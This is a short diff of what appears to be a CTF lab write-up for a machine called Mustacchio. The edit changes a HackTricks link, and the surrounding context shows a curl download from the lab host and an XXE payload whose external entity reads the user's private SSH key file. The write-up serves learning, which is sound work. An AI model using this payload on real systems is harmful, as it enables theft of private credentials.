@@ -211,7 +211,7 @@ $ curl http://mustacchio.thm:8765/auth/dontforget.bak -o barry.bak
         Sanitize XPath queries and consider using parameterized queries to mitigate this risk.
  
 ## XXE vulnerability payload
-> found in [hacktricks](#https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
+> found in ![hacktricks](#https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
 ```xml
 <!--?xml version="1.0" ?-->
 <!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
